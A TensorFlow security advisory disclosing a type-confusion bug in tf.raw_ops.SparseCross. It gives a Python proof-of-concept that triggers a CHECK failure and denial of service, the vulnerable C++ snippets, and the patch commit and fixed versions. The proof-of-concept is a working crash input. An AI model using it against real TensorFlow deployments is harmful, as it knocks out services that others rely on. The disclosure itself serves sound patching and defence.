summary: "CHECK-fail in SparseCross due to type confusion\n### Impact\nThe API of `tf.raw_ops.SparseCross`\
  \ allows combinations which would result in a `CHECK`-failure and denial of service:\n\n```python\n\
  import tensorflow as tf\n\nhashed_output = False\nnum_buckets = 1949315406\nhash_key = 1869835877\n\
  out_type = tf.string \ninternal_type = tf.string\n\nindices_1 = tf.constant([0, 6], shape=[1,\
  \ 2], dtype=tf.int64)\nindices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)\nindices\
  \ = [indices_1, indices_2]\n\nvalues_1 = tf.constant([0], dtype=tf.int64)\nvalues_2 = tf.constant([72],\
  \ dtype=tf.int64)\nvalues = [values_1, values_2]\n\nbatch_size = 4\nshape_1 = tf.constant([4,\
  \ 122], dtype=tf.int64)\nshape_2 = tf.constant([4, 188], dtype=tf.int64)\nshapes = [shape_1,\
  \ shape_2]\n\ndense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)\ndense_2\
  \ = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)\ndense_3 = tf.constant([188,\
  \ 188, 341, 922], shape=[4, 1], dtype=tf.int64)\ndenses = [dense_1, dense_2, dense_3]\n\n\
  tf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses,\
  \ hashed_output=hashed_output,\n                       num_buckets=num_buckets, hash_key=hash_key,\
  \ out_type=out_type, internal_type=internal_type)\n```\n\nThe above code will result in a\
  \ `CHECK` fail in [`tensor.cc`](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/framework/tensor.cc#L670-L675):\n\
  \n```cc\nvoid Tensor::CheckTypeAndIsAligned(DataType expected_dtype) const {\n  CHECK_EQ(dtype(),\
  \ expected_dtype)\n      << \" \" << DataTypeString(expected_dtype) << \" expected, got \"\
  \n      << DataTypeString(dtype());\n  ...\n}\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/kernels/sparse_cross_op.cc#L114-L116)\
  \ is tricked to consider a tensor of type `tstring` which in fact contains integral elements:\n\
  \n```cc\n  if (DT_STRING == values_.dtype())\n      return Fingerprint64(values_.vec<tstring>().data()[start\
  \ + n]);\n  return values_.vec<int64>().data()[start + n];\n```\n\nFixing the type confusion\
  \ by preventing mixing `DT_STRING` and `DT_INT64` types solves this issue.\n\n### Patches\n\
  We have patched the issue in GitHub commit [b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025](https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025).\n\
  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow\
  \ 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected\
  \ and still in supported range.\n\n### For more information\nPlease consult [our security\
  \ guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information\
  \ regarding the security model and how to contact us with issues and questions.\n\n### Attribution\n\
  This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
